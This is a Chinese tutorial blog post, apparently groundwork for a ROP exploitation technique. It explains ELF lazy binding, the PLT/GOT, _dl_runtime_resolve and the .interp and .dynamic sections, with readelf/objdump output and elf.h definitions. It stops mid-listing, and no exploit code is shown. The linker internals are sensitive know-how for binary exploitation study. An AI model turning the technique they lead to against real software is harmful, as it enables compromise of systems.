      <content type="html"><![CDATA[<blockquote><p>一种高级的ROP漏洞利用技术。<br>要想弄懂这个ROP利用技巧，需要首先理解ELF文件的基本结构，以及动态链接的基本过程。<br>glibc源码看的想吐。<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;——当你的才华还配不上你的野心时，请静下来好好努力！<br><a id="more"></a></p></blockquote><h2 id="1、延迟绑定"><a href="#1、延迟绑定" class="headerlink" title="1、延迟绑定"></a>1、延迟绑定</h2><p>&emsp;&emsp;<code>动态链接</code>的确有很多优势，比<code>静态链接</code>要灵活得多，但它是以牺牲<code>一部分性能</code>为代价的。据统计，ELF程序在<code>静态链接</code>下要比<code>动态库</code>稍微快点，大约为1%～5%，当然这取决于<code>程序本身的特性</code>及<code>运行环境</code>等。我们知道动态链接比静态链接慢的<strong><code>主要原因</code></strong>是动态链接下对于<code>全局和静态的数据</code>访问都要进行复杂的<code>GOT定位</code>，然后<code>间接寻址</code>；对于<code>模块间的调用</code>也要先<code>定位GOT</code>，然后再进行<code>间接跳转</code>，如此一来，程序的运行速度必定会减慢。<strong><code>另外一个减慢运行速度的原因</code></strong>是动态链接的<code>链接工作</code>在<code>运行时</code>完成，即程序开始执行时，动态链接器都要进行一次链接工作，正如我们上面提到的，<code>动态链接器</code>会寻找并装载所需要的<code>共享对象</code>，然后进行<code>符号查找、地址重定位</code>等工作，这些工作势必减慢程序的<code>启动速度</code>。这是影响动态链接性能的<strong><code>两个主要问题</code></strong>，我们将在这一节介绍优化动态链接性能的一些方法。[<a href="#Ref1">1</a>]</p><h3 id="1-1、延迟绑定的实现"><a href="#1-1、延迟绑定的实现" class="headerlink" title="1.1、延迟绑定的实现"></a>1.1、延迟绑定的实现</h3><h4 id="1-1-1、PLT的基本原理"><a href="#1-1-1、PLT的基本原理" class="headerlink" title="1.1.1、PLT的基本原理"></a>1.1.1、PLT的基本原理</h4><p>&emsp;&emsp;在<code>动态链接</code>下，程序模块之间包含了大量的<code>函数引用</code>（<code>全局变量</code>往往比较少，因为大量的全局变量会导致<code>模块之间耦合度</code>变大），所以在<code>程序开始执行前</code>，动态链接会耗费不少时间用于解决模块之间的<code>函数引用</code>的<code>符号查找</code>以及<code>重定位</code>，这也是我们上面提到的减慢动态链接性能的<strong><code>第二个原因</code></strong>。不过可以想象，在一个程序运行过程中，可能<code>很多函数在程序执行完时都不会被用到</code>，比如一些错误处理函数或者是一些用户很少用到的功能模块等，如果一开始就把所有函数都链接好实际上是一种浪费。所以ELF采用了一种叫做<strong><code>延迟绑定(Lazy Binding)</code></strong>的做法，<code>基本的思想</code>就是当函数<code>第一次被用到时</code>才进行绑定（符号查找、重定位等），如果<code>没有用到</code>则不进行绑定。所以程序开始执行时，模块间的函数调用都没有进行绑定，而是需要用到时才由<code>动态链接器</code>来负责绑定。这样的做法可以大大<code>加快</code>程序的<code>启动速度</code>，特别有利于一些有<code>大量函数引用</code>和<code>大量模块</code>的程序。[<a href="#Ref1">1</a>]</p><p>&emsp;&emsp;ELF使用<strong><code>PLT(Procedure Linkage Table)</code></strong>的方法来实现，这种方法使用了一些很精巧的指令序列来完成。在开始详细介绍PLT之前，我们先从<code>动态链接器的角度</code>设想一下：假设<code>liba.so</code>需要调用<code>libc.so</code>中的<code>bar()</code>函数，那么当<code>liba.so</code>中<code>第一次</code>调用<code>bar()</code>时，这时候就需要调用<code>动态链接器</code>中的<code>某个函数</code>来完成<code>地址绑定</code>工作，我们假设这个函数叫做<code>lookup()</code>，那么lookup()需要知道<code>哪些必要的信息</code>才能完成这个函数地址绑定工作呢？我想答案很明显，lookup()至少需要知道这个地址绑定发生在<code>哪个模块</code>，<code>哪个函数</code>？那么我们可以假设lookup的原型为<code>lookup(module, function)</code>，这两个参数的值在我们这个例子中分别为<code>liba.so</code>和<code>bar()</code>。在<code>Glibc</code>中，我们这里的<code>lookup()</code>函数真正的名字叫<strong><code>_dl_runtime_resolve()</code></strong>。[<a href="#Ref1">1</a>]</p><p>&emsp;&emsp;当我们调用某个<code>外部模块</code>的函数时，如果按照通常的做法应该是通过<code>GOT中相应的项</code>进行<code>间接跳转</code>。<strong><code>PLT</code></strong>为了实现<code>延迟绑定</code>，在这个过程中间又<code>增加了一层间接跳转</code>。<code>调用函数</code>并不直接通过<code>GOT</code>跳转，而是通过一个叫作<strong><code>PLT项</code></strong>的结构来进行跳转。<code>每个外部函数</code>在<code>PLT</code>中都有一个<code>相应的项</code>，比如<code>bar()</code>函数在<code>PLT</code>中的项的地址我们称之为<code>bar@plt</code>。让我们来看看bar@plt的实现：[<a href="#Ref1">1</a>]<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">bar@plt:</span></span><br><span class="line"><span class="keyword">jmp</span> *(bar@GOT)              <span class="comment">;*(bar@GOT)为bar()在GOT表中相应项的地址</span></span><br><span class="line"><span class="keyword">push</span> n                      <span class="comment">;bar()在重定位表“.rel.plt”中相应项的字节偏移</span></span><br><span class="line"><span class="keyword">push</span> moduleID               <span class="comment">;GOT[1],bar()所在共享库的moduleID</span></span><br><span class="line">jump _dl_runtime_resolve    <span class="comment">;GOT[2],动态链接器的_dl_runtime_resolve()函数</span></span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;<code>bar@plt</code>的<strong><code>第一条指令</code></strong>是一条通过GOT间接跳转的指令。<code>bar@GOT</code>表示GOT中保存bar()这个函数相应的项。如果链接器在<code>初始化阶段</code>已经<code>初始化该项</code>，并且将<code>bar()的地址</code>填入该项，那么这个跳转指令的结果就是我们所期望的，跳转到bar()，实现函数正确调用。但是为了<code>实现延迟绑定</code>，链接器在<code>初始化阶段</code>并没有将<code>bar()的地址</code>填入到该项，而是将上面代码中<code>第二条指令“push n”的地址</code>填入到<code>bar@GOT</code>中，这个步骤<code>不需要</code>查找任何符号，所以<code>代价很低</code>。很明显，第一条指令的效果是跳转到第二条指令，相当于没有进行任何操作。<strong><code>第二条指令</code></strong>将一个<code>数字n</code>压入堆栈中，这个数字是<code>bar</code>这个符号引用在<code>重定位表“.rel.plt”</code>中的相应项的<code>字节偏移</code>。接着<strong><code>又是一条push指令</code></strong>将<code>模块的ID</code>压入到堆栈，然后跳转到<strong><code>_dl_runtime_resolve</code></strong>。这实际上就是在实现我们前面提到的<code>lookup(module, function)</code>这个函数的<code>调用</code>：先将所<code>需要重定位的符号</code>在<code>重定位表“.rel.plt”</code>中的相应项的<code>字节偏移</code>压入堆栈，再将模块ID压入堆栈，然后调用动态链接器的<code>_dl_runtime_resolve()</code>函数来完成<code>符号解析</code>和<code>重定位</code>工作。<code>_dl_runtime_resolve()</code>在进行一系列工作以后将<code>bar()的真正地址</code>填入到<code>bar@GOT</code>中。[<a href="#Ref1">1</a>]</p><p>&emsp;&emsp;一旦<code>bar()</code>这个函数被<strong><code>解析完毕</code></strong>，当我们<code>再次调用</code>bar@plt时，<code>第一条jmp指令</code>就能够跳转到<code>真正的bar()函数</code>中，<code>bar()函数返回</code>的时候会根据<code>堆栈里面保存的返回地址</code>直接<code>返回到调用者</code>，而不会再继续执行bar@plt中<code>第二条指令开始的那段代码</code>，那段代码只会在<code>符号未被解析时</code>执行一次。[<a href="#Ref1">1</a>]</p><h4 id="1-1-2、PLT的真正实现"><a href="#1-1-2、PLT的真正实现" class="headerlink" title="1.1.2、PLT的真正实现"></a>1.1.2、PLT的真正实现</h4><p>&emsp;&emsp;上面我们描述的是<strong><code>PLT的基本原理</code></strong>，<code>PLT真正的实现</code>要比它的结构稍微复杂一些。ELF将<code>GOT</code>拆分成了两个表叫做<strong><code>“.got”</code></strong>和<strong><code>“.got.plt”</code></strong>。其中<strong><code>“.got”</code></strong>用来保存<code>全局变量引用</code>的地址，<strong><code>“.got.plt”</code></strong>用来保存<code>函数引用</code>的地址，也就是说，所有对于<code>外部函数的引用</code>全部被分离出来放到了<code>“.got.plt”</code>中。另外<strong><code>“.got.plt”</code></strong>还有一个特殊的地方是它的<code>前三项</code>是有<code>特殊意义</code>的，分别含义如下：[<a href="#Ref1">1</a>]<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GOT[0]：保存的是“.dynamic”节的地址，这个节描述了本模块动态链接相关的信息，我们在后面还会介绍“.dynamic”节。</span><br><span class="line">GOT[1]：保存的是本模块的ID。link_map结构的地址，动态链接器利用该地址来对符号进行解析。</span><br><span class="line">GOT[2]：保存的是_dl_runtime_resolve()的地址。</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;其中<strong><code>第二项</code></strong>和<strong><code>第三项</code></strong>由<code>动态链接器</code>在<code>装载共享模块</code>的时候负责将它们<code>初始化</code>。<strong><code>“.got.plt”</code></strong>的<code>其余项</code>分别对应<code>每个外部函数的引用</code>。PLT的结构也与我们示例中的PLT稍有不同，为了减少代码的重复，ELF把上面例子中的<code>最后两条指令</code>放到<code>PLT</code>中的<strong><code>第一项</code></strong>。并且规定<code>每一项的长度是16个字节</code>，刚好用来存放<code>3条指令</code>，<strong><code>实际的PLT基本结构</code></strong>如图所示：[<a href="#Ref1">1</a>]</p><div align="left"><img src="/resources/2020/实际的PLT基本结构.png" width="50%" height="50%" alt="实际的PLT基本结构"></div><p>实际的<code>PLT基本结构代码</code>如下：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">PLT0:</span></span><br><span class="line"><span class="keyword">push</span> *(GOT + <span class="number">4</span>)     <span class="comment">;GOT[1],bar()所在共享库的moduleID,link_map结构的地址</span></span><br><span class="line">jump *(GOT + <span class="number">8</span>)     <span class="comment">;GOT[2],动态链接器的_dl_runtime_resolve()函数的地址</span></span><br><span class="line">......</span><br><span class="line"><span class="symbol">bar@plt:</span></span><br><span class="line"><span class="keyword">jmp</span> *(bar@GOT)      <span class="comment">;*(bar@GOT)为bar()在GOT表中相应项的地址</span></span><br><span class="line"><span class="keyword">push</span> n              <span class="comment">;bar()在重定位表“.rel.plt”中相应项的字节偏移</span></span><br><span class="line">jump PLT0</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;<code>PLT</code>在ELF文件中以<code>独立的节</code>存放，节名通常叫做<strong><code>“.plt”</code></strong>，因为它本身是一些<code>地址无关的代码</code>，所以可以跟<code>代码节</code>等一起合并成同一个<code>可读可执行</code>的<code>“Segment”</code>被装载入内存。[<a href="#Ref1">1</a>]</p><h2 id="2、动态链接相关结构"><a href="#2、动态链接相关结构" class="headerlink" title="2、动态链接相关结构"></a>2、动态链接相关结构</h2><p>&emsp;&emsp;<code>动态链接</code>在<code>不同的系统</code>上有不同的实现方式，<code>ELF</code>的动态链接实现方式比<code>PE</code>稍微简单一点。<code>动态链接</code>的<code>可执行文件的装载</code>与<code>静态链接</code>情况基本一样。首先<code>操作系统</code>会读取<code>可执行文件的头部</code>，检查<code>文件的合法性</code>，然后从头部中的<code>“Program Header Table”</code>中读取每个<code>“Segment”</code>的<code>虚拟地址</code>、<code>文件地址</code>和<code>属性</code>，并将它们映射到<code>进程虚拟空间</code>的相应位置，这些步骤跟前面的静态链接情况下的装载基本无异。</p><p>&emsp;&emsp;在<strong><code>静态链接</code></strong>情况下，<code>操作系统</code>接着就<code>可以</code>把<code>控制权</code>转交给<code>可执行文件的入口地址</code>，然后程序开始执行，一切看起来非常直观。</p><p>&emsp;&emsp;在<strong><code>动态链接</code></strong>情况下，<code>操作系统</code>还<code>不能</code>在<code>装载完可执行文件</code>之后就把<code>控制权</code>交给<code>可执行文件</code>，因为我们知道<code>可执行文件</code>依赖于很多<code>共享对象</code>。这时候，可执行文件里对于很多<code>外部符号的引用</code>还处于<code>无效地址</code>的状态，即还没有跟<code>相应的共享对象</code>中的<code>实际位置</code>链接起来。所以在映射完可执行文件之后，操作系统会先启动一个<strong><code>动态链接器(Dynamic Linker)</code></strong>。</p><p>&emsp;&emsp;在<code>Linux</code>下，<strong><code>动态链接器ld.so</code></strong>实际上是一个<code>共享对象</code>，操作系统同样通过<code>映射的方式</code>将它加载到<code>进程的地址空间</code>中。操作系统在<code>加载完动态链接器</code>之后，就将控制权交给<code>动态链接器的入口地址</code>（与可执行文件一样，共享对象也有入口地址）。当<code>动态链接器</code>得到<code>控制权</code>之后，它开始执行一系列<code>自身的初始化</code>操作，然后根据当前的<code>环境参数</code>，开始对<code>可执行文件</code>进行<code>动态链接工作</code>。当所有<code>动态链接工作</code>完成以后，<code>动态链接器</code>会将<code>控制权</code>转交到<code>可执行文件的入口地址</code>，程序开始正式执行。[<a href="#Ref1">1</a>]</p><h3 id="2-0、标准ELF变量类型"><a href="#2-0、标准ELF变量类型" class="headerlink" title="2.0、标准ELF变量类型"></a>2.0、标准ELF变量类型</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Standard ELF types.  */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Type for a 16-bit quantity.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint16_t</span> Elf32_Half;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint16_t</span> Elf64_Half;</span><br><span class="line"><span class="comment">/* Types for signed and unsigned 32-bit quantities.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint32_t</span> Elf32_Word;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int32_t</span>  Elf32_Sword;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint32_t</span> Elf64_Word;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int32_t</span>  Elf64_Sword;</span><br><span class="line"><span class="comment">/* Types for signed and unsigned 64-bit quantities.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint64_t</span> Elf32_Xword;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int64_t</span>  Elf32_Sxword;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint64_t</span> Elf64_Xword;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int64_t</span>  Elf64_Sxword;</span><br><span class="line"><span class="comment">/* Type of addresses.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint32_t</span> Elf32_Addr;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint64_t</span> Elf64_Addr;</span><br><span class="line"><span class="comment">/* Type of file offsets.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint32_t</span> Elf32_Off;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint64_t</span> Elf64_Off;</span><br><span class="line"><span class="comment">/* Type for section indices, which are 16-bit quantities.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint16_t</span> Elf32_Section;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint16_t</span> Elf64_Section;</span><br><span class="line"><span class="comment">/* Type for version symbol information.  */</span></span><br><span class="line"><span class="keyword">typedef</span> Elf32_Half Elf32_Versym;</span><br><span class="line"><span class="keyword">typedef</span> Elf64_Half Elf64_Versym;</span><br></pre></td></tr></table></figure><h3 id="2-1、“-interp”节"><a href="#2-1、“-interp”节" class="headerlink" title="2.1、“.interp”节"></a>2.1、“.interp”节</h3><p>&emsp;&emsp;<code>动态链接器的位置</code>既不是由<code>系统配置</code>指定，也不是由<code>环境参数</code>决定，而是由<code>ELF可执行文件</code>决定。在<code>动态链接</code>的<code>ELF可执行文件</code>中，有一个专门的节叫做<strong><code>“.interp”</code></strong>节（“interp”是<code>“interpreter”(解释器)</code>的缩写）。如果我们使用<code>objdump</code>工具来查看，可以看到<code>“.interp”</code>内容：[<a href="#Ref1">1</a>]<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ objdump -s pwn200</span><br><span class="line"></span><br><span class="line">pwn200:     file format elf32-i386</span><br><span class="line"></span><br><span class="line">Contents of section .interp:</span><br><span class="line"> 8048134 2f6c6962 2f6c642d 6c696e75 782e736f  /lib/ld-linux.so</span><br><span class="line"> 8048144 2e3200                               .2.</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;<strong><code>“.interp”</code></strong>的内容很简单，里面保存的就是<code>一个字符串</code>，这个字符串就是<code>可执行文件</code>所需要的<code>动态链接器的路径</code>，在<code>Linux</code>下，可执行文件所需要的动态链接器的路径几乎都是<code>“/lib/ld-linux.so.2”</code>，其他的<code>*nix操作系统</code>可能会有不同的路径。在<code>Linux</code>的系统中，<code>/lib/ld-linux.so.2</code>通常是一个<code>软链接</code>，比如在我的机器上，它指向<code>/lib/ld-2.6.1.so</code>，这个才是真正的<code>动态链接器</code>。在Linux中，操作系统在对<code>可执行文件</code>的进行<code>加载</code>的时候，它会去寻找<code>装载</code>该可执行文件所需要相应的<code>动态链接器</code>，即<code>“.interp”</code>节指定的路径的<code>共享对象</code>。</p><p>&emsp;&emsp;<code>动态链接器</code>在Linux下是<code>Glibc的一部分</code>，也就是属于<code>系统库级别</code>的，它的<code>版本号</code>往往跟系统中的<code>Glibc库版本号</code>是一样的，比如我的系统中安装的是<code>Glibc 2.6.1</code>，那么相应的<code>动态链接器</code>也就是<code>/lib/ld-2.6.1.so</code>。当系统中的<code>Glibc库更新</code>或者安装<code>其他版本</code>的时候，<code>/lib/ld-linux.so.2</code>这个<code>软链接</code>就会指向到<code>新的动态链接器</code>，而<code>可执行文件</code>本身不需要修改<code>“.interp”</code>中的<code>动态链接器路径</code>来适应系统的升级。</p><p>&emsp;&emsp;我们也可以用这个命令来查看一个<code>可执行文件</code>所需要的<code>动态链接器的路径</code>，在Linux下，往往是如下结果：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -l a.out | grep interpreter</span><br><span class="line">      [Requesting program interpreter: /lib/ld-linux.so.2]</span><br></pre></td></tr></table></figure></p><p>而当我们在<code>FreeBSD 4.6.2</code>下执行这个命令时，结果是：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -l a.out | grep interpreter</span><br><span class="line">     [Requesting program interpreter: /usr/libexec/ld-elf.so.1]</span><br></pre></td></tr></table></figure></p><p><code>64位的Linux</code>下的可执行文件是：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -l a.out | grep interpreter</span><br><span class="line">     [Requesting program interpreter: /lib64/ld-linux-x86-64.so.2]</span><br></pre></td></tr></table></figure></p><h3 id="2-2、“-dynamic”节"><a href="#2-2、“-dynamic”节" class="headerlink" title="2.2、“.dynamic”节"></a>2.2、“.dynamic”节</h3><p>&emsp;&emsp;类似于<code>“.interp”</code>这样的节，ELF中还有几个节也是<code>专门用于动态链接</code>的，比如<code>“.dynamic”节</code>和<code>“.dynsym”节</code>等。要了解<code>动态链接器</code>如何完成<code>链接过程</code>，跟前面一样，从了解<code>ELF文件</code>中跟<code>动态链接相关的结构</code>入手将会是一个很好的途径。ELF文件中跟动态链接相关的节有好几个，相互之间的关系也比较复杂，我们先从<code>“.dynamic”节</code>入手。</p><p>&emsp;&emsp;动态链接ELF中<code>最重要的结构</code>应该是<strong><code>“.dynamic”节</code></strong>，这个节里面保存了<code>动态链接器</code>所需要的<code>基本信息</code>，比如依赖于哪些<code>共享对象</code>、<code>动态链接符号表</code>的位置、<code>动态链接重定位表</code>的位置、<code>共享对象初始化代码</code>的地址等。<code>“.dynamic”节的结构</code>很经典，就是我们已经碰到过的ELF中眼熟的<code>结构数组</code>，结构定义在<code>“elf.h”</code>中：[<a href="#Ref3">3</a>]<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf32_Sword d_tag;</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        Elf32_Word d_val;</span><br><span class="line">        Elf32_Addr d_ptr;</span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf32_Dyn;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf64_Sxword d_tag;</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        Elf64_Xword d_val;  </span><br><span class="line">        Elf64_Addr d_ptr;    </span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf64_Dyn;</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;<code>Elf32_Dyn</code>结构由一个<code>类型值</code>加上一个附加的<code>数值</code>或<code>指针</code>，对于<code>不同的类型</code>，后面附加的<code>数值</code>或者<code>指针</code>有着<code>不同的含义</code>。我们这里列举几个比较<code>常见的类型值</code>(这些值都是定义在<code>“elf.h”里面的宏</code>)，如下表所示：[<a href="#Ref3">3</a>]</p><table><thead><tr><th style="text-align:left">d_tag类型</th><th style="text-align:left">d_un的含义</th></tr></thead><tbody><tr><td style="text-align:left">DT_NEEDED</td><td style="text-align:left">ELF所依赖的共享库文件名，d_val表示共享库文件名在“.dynstr”表中的偏移</td></tr><tr><td style="text-align:left">DT_INIT</td><td style="text-align:left">d_ptr表示init函数地址</td></tr><tr><td style="text-align:left">DT_INIT_ARRAY</td><td style="text-align:left">d_ptr表示有关初始化的函数的地址数组的地址</td></tr><tr><td style="text-align:left">DT_INIT_ARRAYSZ</td><td style="text-align:left">d_val表示DT_INIT_ARRAY数组的大小</td></tr><tr><td style="text-align:left">DT_FINI</td><td style="text-align:left">d_ptr表示fini函数地址</td></tr><tr><td style="text-align:left">DT_FINI_ARRAY</td><td style="text-align:left">d_ptr表示有关结束清理的函数的地址数组的地址</td></tr><tr><td style="text-align:left">DT_FINI_ARRAYSZ</td><td style="text-align:left">d_val表示DT_FINI_ARRAY数组的大小</td></tr><tr><td style="text-align:left">DT_HASH</td><td style="text-align:left">动态链接符号Hash表地址，d_ptr表示“.hash”的地址</td></tr><tr><td style="text-align:left">DT_GNU_HASH</td><td style="text-align:left">动态链接GNU风格的Hash表的地址，d_ptr表示“.gnu.hash”的地址</td></tr><tr><td style="text-align:left">DT_STRTAB</td><td style="text-align:left">动态链接字符串表的地址，d_ptr表示“.dynstr”的地址</td></tr><tr><td style="text-align:left">DT_STRSZ</td><td style="text-align:left">d_val表示动态链接字符串表“.dynstr”的大小</td></tr><tr><td style="text-align:left">DT_SYMTAB</td><td style="text-align:left">动态链接符号表的地址，d_ptr表示“.dynsym”的地址</td></tr><tr><td style="text-align:left">DT_SYMENT</td><td style="text-align:left">d_val表示动态链接符号表“.dynsym”中每一项的大小</td></tr><tr><td style="text-align:left">DT_PLTGOT</td><td style="text-align:left">d_ptr表示全局偏移表“.got.plt”地址。</td></tr><tr><td style="text-align:left">DT_PLTREL</td><td style="text-align:left">d_val表示动态链接重定位表的类型值“d_tag”，也就是DT_REL对应的值</td></tr><tr><td style="text-align:left">DT_PLTRELSZ</td><td style="text-align:left">d_val表示动态链接重定位表中函数重定位表“.rel.plt”的大小</td></tr><tr><td style="text-align:left">DT_JMPREL</td><td style="text-align:left">d_ptr表示动态链接重定位表中函数重定位表“.rel.plt”的地址</td></tr><tr><td style="text-align:left">DT_REL</td><td style="text-align:left">d_ptr表示动态链接重定位表的地址(ELF32)</td></tr><tr><td style="text-align:left">DT_RELSZ</td><td style="text-align:left">d_val表示动态链接重定位表中变量重定位表“.rel.dyn”的大小(ELF32)</td></tr><tr><td style="text-align:left">DT_RELENT</td><td style="text-align:left">d_val表示动态链接重定位表中每一项的大小(ELF32)</td></tr><tr><td style="text-align:left">DT_RELA</td><td style="text-align:left">d_ptr表示动态链接重定位表的地址(ELF64)</td></tr><tr><td style="text-align:left">DT_RELASZ</td><td style="text-align:left">d_val表示动态链接重定位表中变量重定位表“.rel.dyn”的大小(ELF64)</td></tr><tr><td style="text-align:left">DT_RELAENT</td><td style="text-align:left">d_val表示动态链接重定位表中每一项的大小(ELF64)</td></tr><tr><td style="text-align:left">DT_VERNEED</td><td style="text-align:left">d_ptr表示ELF文件所需要的库文件版本表的地址</td></tr><tr><td style="text-align:left">DT_VERNEEDNUM</td><td style="text-align:left">d_val表示ELF文件所需要的库文件版本表条目的数量</td></tr><tr><td style="text-align:left">DT_VERSYM</td><td style="text-align:left">d_ptr表示动态符号版本表“.gnu.version”的地址</td></tr><tr><td style="text-align:left">DT_SONAME</td><td style="text-align:left">d_val表示共享库名称</td></tr><tr><td style="text-align:left">DT_RPATH</td><td style="text-align:left">d_val表示库搜索路径（不建议使用）</td></tr><tr><td style="text-align:left">DT_NULL</td><td style="text-align:left">标记“.dynamic”节的结束</td></tr></tbody></table><p><strong><code>定义代码：</code></strong>[<a href="#Ref3">3</a>]<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Legal values for d_tag (dynamic entry type).  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_NULL     0   <span class="comment">/* Marks end of dynamic section */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_NEEDED   1   <span class="comment">/* Name of needed library */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_PLTRELSZ 2   <span class="comment">/* Size in bytes of PLT relocs */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_PLTGOT   3   <span class="comment">/* Processor defined value */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_HASH     4   <span class="comment">/* Address of symbol hash table */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_STRTAB   5   <span class="comment">/* Address of string table */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_SYMTAB   6   <span class="comment">/* Address of symbol table */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_RELA     7   <span class="comment">/* Address of Rela relocs */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_RELASZ   8   <span class="comment">/* Total size of Rela relocs */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_RELAENT  9   <span class="comment">/* Size of one Rela reloc */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_STRSZ    10  <span class="comment">/* Size of string table */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_SYMENT   11  <span class="comment">/* Size of one symbol table entry */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_INIT     12  <span class="comment">/* Address of init function */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_FINI     13  <span class="comment">/* Address of termination function */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_SONAME   14  <span class="comment">/* Name of shared object */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_RPATH    15  <span class="comment">/* Library search path (deprecated) */</span></span></span><br><span 